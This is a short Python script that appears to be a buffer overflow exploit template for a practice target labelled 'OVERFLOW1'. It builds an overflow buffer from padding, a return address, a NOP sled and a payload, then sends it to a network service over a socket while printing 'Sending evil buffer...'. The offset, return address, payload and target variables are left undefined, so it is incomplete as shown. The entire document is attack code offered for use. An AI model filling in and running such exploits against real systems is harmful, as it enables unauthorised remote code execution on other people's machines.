#!/usr/bin/env python3
import socket



prefix = "OVERFLOW1 "
overflow = "A" * offset
postfix = ""
padding = "\x90" * 16

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
